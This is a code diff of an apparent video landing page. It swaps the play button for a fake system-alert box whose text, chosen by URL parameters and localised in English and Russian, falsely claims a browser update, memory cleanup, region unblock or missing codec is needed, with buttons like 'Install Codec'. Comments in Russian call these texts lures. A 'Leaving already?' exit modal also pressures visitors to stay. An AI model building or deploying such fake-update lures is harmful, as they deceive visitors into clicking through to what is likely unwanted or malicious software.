@@ -86,154 +86,70 @@
         return l;
       };
 
-    const MODAL_I18N = {
-  en: {
-    title: "Leaving already? 😢",
-    desc: "Wait—video is almost loaded. The best part starts in a second.",
-    stay: "Stay",
-    leave: "Leave"
-  },
+      // СЛОВАРЬ (EXIT MODAL + НОВЫЕ ТИПЫ ЗАМАНУХИ)
+      const MODAL_I18N = {
+        en: {
+          title: "Leaving already? 😢",
+          desc: "Wait—video is almost loaded. The best part starts in a second.",
+          stay: "Stay",
+          leave: "Leave",
+          
+          // --- ТИПЫ ДЛЯ ЗАМАНУХИ (Default fallback) ---
+          t1: { h: "Browser Update Required", t: "Video format not supported. Update Chrome to continue.", b: "Update Browser" },
+          t2: { h: "System Warning", t: "Not enough memory to buffer video. Clean junk files.", b: "Clean Now" },
+          t3: { h: "Content Blocked", t: "This video is restricted in {country}. Enable Secure Mode.", b: "Unblock Video" },
+          t4: { h: "Playback Error", t: "Video codec is missing or outdated. Install plugin to play.", b: "Install Codec" }
+        },
 
-  es: {
-    title: "¿Ya te vas? 😢",
-    desc: "Espera: el video casi se ha cargado. Lo mejor empieza en un segundo.",
-    stay: "Quedarme",
-    leave: "Salir"
-  },
+        ru: {
+          title: "Уже уходишь? 😢",
+          desc: "Подожди! Видео почти загрузилось, самое интересное через секунду.",
+          stay: "Остаться",
+          leave: "Уйти",
+          
+          // --- ТИПЫ ДЛЯ ЗАМАНУХИ (RU) ---
+          t1: { h: "Браузер устарел", t: "Видео не поддерживается. Обновите браузер для просмотра.", b: "Обновить" },
+          t2: { h: "Память переполнена", t: "Недостаточно памяти для видео. Очистите мусор.", b: "Очистить" },
+          t3: { h: "Контент заблокирован", t: "Видео недоступно в регионе {country}. Включите защиту.", b: "Разблокировать" },
+          t4: { h: "Ошибка воспроизведения", t: "Кодек устарел или отсутствует. Установите плагин.", b: "Установить" }
+        },
+        
+        // ... Можешь добавить другие языки (es, de, etc.) копированием блоков
+      };
 
-  pt: {
-    title: "Já vai embora? 😢",
-    desc: "Espera — o vídeo quase carregou. A melhor parte começa já.",
-    stay: "Ficar",
-    leave: "Sair"
-  },
-
-  ru: {
-    title: "Уже уходишь? 😢",
-    desc: "Подожди! Видео почти загрузилось, самое интересное через секунду.",
-    stay: "Остаться",
-    leave: "Уйти"
-  },
-
-  uk: {
-    title: "Вже йдеш? 😢",
-    desc: "Зачекай! Відео майже завантажилось, найцікавіше за мить.",
-    stay: "Залишитись",
-    leave: "Вийти"
-  },
-
-  de: {
-    title: "Gehst du schon? 😢",
-    desc: "Warte — das Video ist fast geladen. Der beste Teil kommt gleich.",
-    stay: "Bleiben",
-    leave: "Verlassen"
-  },
-
-  fr: {
-    title: "Tu pars déjà ? 😢",
-    desc: "Attends — la vidéo est presque chargée. Le meilleur arrive.",
-    stay: "Rester",
-    leave: "Quitter"
-  },
-
-  it: {
-    title: "Vai già via? 😢",
-    desc: "Aspetta — il video è quasi caricato. Il meglio arriva ora.",
-    stay: "Resta",
-    leave: "Esci"
-  },
-
-  tr: {
-    title: "Şimdiden gidiyor musun? 😢",
-    desc: "Bekle — video neredeyse yüklendi. En iyi kısım birazdan.",
-    stay: "Kal",
-    leave: "Çık"
-  },
-
-  pl: {
-    title: "Już wychodzisz? 😢",
-    desc: "Poczekaj — wideo prawie się załadowało. Najlepsze za chwilę.",
-    stay: "Zostań",
-    leave: "Wyjdź"
-  },
-
-  ro: {
-    title: "Pleci deja? 😢",
-    desc: "Așteaptă — videoclipul aproape s-a încărcat. Urmează partea cea mai bună.",
-    stay: "Rămân",
-    leave: "Ies"
-  },
-
-  hu: {
-    title: "Már mész? 😢",
-    desc: "Várj — a videó majdnem betöltött. A legjobb rész következik.",
-    stay: "Maradok",
-    leave: "Kilépek"
-  },
-
-  cs: {
-    title: "Už odcházíš? 😢",
-    desc: "Počkej — video je téměř načtené. To nejlepší přijde hned.",
-    stay: "Zůstat",
-    leave: "Odejít"
-  },
-
-  id: {
-    title: "Sudah mau pergi? 😢",
-    desc: "Tunggu — video hampir siap. Bagian terbaik segera dimulai.",
-    stay: "Tetap",
-    leave: "Keluar"
-  },
-
-  th: {
-    title: "จะไปแล้วเหรอ? 😢",
-    desc: "รอก่อน! วิดีโอใกล้โหลดเสร็จแล้ว ช่วงที่ดีที่สุดกำลังจะมา",
-    stay: "อยู่ต่อ",
-    leave: "ออก"
-  },
-
-  vi: {
-    title: "Bạn rời đi rồi sao? 😢",
-    desc: "Đợi chút — video gần tải xong. Phần hay nhất sắp bắt đầu.",
-    stay: "Ở lại",
-    leave: "Rời đi"
-  },
-
-  ms: {
-    title: "Nak pergi sekarang? 😢",
-    desc: "Tunggu — video hampir siap. Bahagian terbaik akan bermula.",
-    stay: "Tunggu",
-    leave: "Keluar"
-  },
-
-  hi: {
-    title: "अभी जा रहे हो? 😢",
-    desc: "रुको — वीडियो लगभग लोड हो गया है। सबसे अच्छा हिस्सा आने वाला है।",
-    stay: "रुको",
-    leave: "जाओ"
-  },
-
-  ar: {
-    title: "هل ستغادر الآن؟ 😢",
-    desc: "انتظر — الفيديو أوشك على التحميل. الأفضل قادم.",
-    stay: "البقاء",
-    leave: "مغادرة"
-  },
-
-  bn: {
-    title: "এখনই চলে যাচ্ছো? 😢",
-    desc: "একটু অপেক্ষা করো — ভিডিও প্রায় লোড হয়ে গেছে। সেরা অংশ আসছে।",
-    stay: "থাকি",
-    leave: "চলে যাই"
-  }
-};
-
-
-      // NOTE: if lang not found -> EN
+      // Функция выбора текстов
       window.__getModalCopy = function () {
         const lang = norm(detectLang());
+        // ФОЛБЕК НА АНГЛИЙСКИЙ, ЕСЛИ ЯЗЫКА НЕТ
         return MODAL_I18N[lang] || MODAL_I18N.en;
       };
+
+      // --- НОВАЯ ЛОГИКА ПОДМЕНЫ ТЕКСТА В ПЛАШКЕ (LURE) ---
+      document.addEventListener("DOMContentLoaded", () => {
+        // 1. Получаем настройки
+        const typeId = sp.get('type') || '4'; // 4 = Codec (default)
+        const country = sp.get('geo') || sp.get('country') || "Your Region";
+        
+        // 2. Берем словарь (текущий язык или EN)
+        const dict = window.__getModalCopy(); 
+        
+        // 3. Выбираем контент по типу (t1..t4). Если тип кривой -> t4
+        let content = dict['t' + typeId];
+        if (!content) content = dict['t4'];
+
+        // 4. Заменяем {country} в тексте
+        const textBody = content.t.replace("{country}", country);
+
+        // 5. Вставляем в HTML
+        const elHead = document.getElementById('lure-head');
+        const elText = document.getElementById('lure-text');
+        const elBtn  = document.getElementById('lure-btn');
+
+        if (elHead) elHead.innerText = content.h;
+        if (elText) elText.innerText = textBody;
+        if (elBtn)  elBtn.innerText  = content.b;
+      });
+
     })();
   </script>
 
@@ -243,7 +159,7 @@
       width: 100%; height: 100vh;
       background: #000;
       overflow: hidden;
-      font-family: sans-serif;
+      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
     }
 
     .xh-zone {
@@ -301,35 +217,79 @@
       background: #000;
     }
 
+    /* --- НОВЫЕ СТИЛИ ДЛЯ ПЛАШКИ (ВМЕСТО КНОПКИ PLAY) --- */
     .xh-main-play-trigger {
       position: absolute;
       top: 50%; left: 50%;
-      transform: translate(-50%, -50%) scale(1);
-      width: 130px; height: 130px;
+      transform: translate(-50%, -50%);
+      width: auto; height: auto; /* Авто-размер */
       z-index: 20;
       opacity: 0;
       visibility: hidden;
       pointer-events: none;
       transition: opacity 0.3s ease;
+      display: flex;
+      justify-content: center;
+      align-items: center;
     }
 
     .xh-main-play-trigger.ready {
       opacity: 1;
       visibility: visible;
       pointer-events: auto;
-      animation: pulsePlay 2.4s ease-in-out infinite;
+      /* Легкая анимация появления */
+      animation: popIn 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
+    }
+    
+    @keyframes popIn {
+        from { transform: translate(-50%, -50%) scale(0.8); opacity: 0; }
+        to { transform: translate(-50%, -50%) scale(1); opacity: 1; }
     }
 
-    @keyframes pulsePlay {
-      0%, 100% { transform: translate(-50%, -50%) scale(1); }
-      50% { transform: translate(-50%, -50%) scale(1.08); }
+    /* Стили окна */
+    .codec-window {
+        background: rgba(28, 28, 30, 0.95);
+        backdrop-filter: blur(10px);
+        border: 1px solid rgba(255, 255, 255, 0.1);
+        border-radius: 14px;
+        padding: 24px;
+        width: 280px;
+        box-shadow: 0 20px 50px rgba(0,0,0,0.7);
+        text-align: center;
+        color: #fff;
     }
 
-    .xh-main-play-trigger svg {
-      width: 100%;
-      height: 100%;
-      filter: drop-shadow(0 0 10px rgba(255, 255, 255, 0.25));
+    .codec-icon { margin-bottom: 12px; }
+    
+    .codec-title {
+        font-size: 17px;
+        font-weight: 700;
+        margin-bottom: 6px;
+        color: #fff;
     }
+
+    .codec-text {
+        font-size: 14px;
+        color: #a0a0a0;
+        margin-bottom: 18px;
+        line-height: 1.4;
+    }
+
+    .codec-btn {
+        background: #0a84ff; /* System Blue */
+        color: white;
+        border: none;
+        width: 100%;
+        padding: 12px;
+        border-radius: 10px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+        transition: background 0.2s;
+    }
+    .codec-btn:active { background: #0070e0; }
+
+    /* --- END NEW STYLES --- */
 
     .xh-bottom-interface {
       position: fixed;
@@ -396,7 +356,6 @@
       display: none;
       align-items: center;
       justify-content: center;
-      font-family: sans-serif;
     }
 
     .xh-modal-overlay {
@@ -478,12 +437,19 @@
       </video>
 
       <div class="xh-zone xh-main-play-trigger" data-target="main_play" aria-label="Play">
-        <svg viewBox="0 0 140 140">
-          <circle cx="70" cy="70" r="66" stroke="white" stroke-width="6" fill="rgba(0,0,0,0.45)"/>
-          <polygon points="55,40 105,70 55,100" fill="white"/>
-        </svg>
+         <div class="codec-window">
+            <div class="codec-icon">
+                <svg width="48" height="48" viewBox="0 0 24 24" fill="none">
+                    <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z" fill="#ffcc00"/>
+                </svg>
+            </div>
+            
+            <div class="codec-title" id="lure-head">System Alert</div>
+            <div class="codec-text" id="lure-text">Error loading video.</div>
+            <button class="codec-btn" id="lure-btn">Fix Now</button>
+        </div>
       </div>
-    </div>
+      </div>
   </div>
 
   <div class="xh-bottom-interface">
@@ -626,8 +592,8 @@
       } else {
         const onFirstVisible = () => {
            if (document.visibilityState === "visible") {
-              start();
-              document.removeEventListener("visibilitychange", onFirstVisible);
+             start();
+             document.removeEventListener("visibilitychange", onFirstVisible);
            }
         };
         document.addEventListener("visibilitychange", onFirstVisible);
@@ -667,9 +633,6 @@
     })();
   </script>
 
-  <script defer src="./assets/scripts/common.js"></script>
+  <script defer src="./assets/scripts/common.js?v=1.0"></script>
 </body>
 </html>
-
-
-
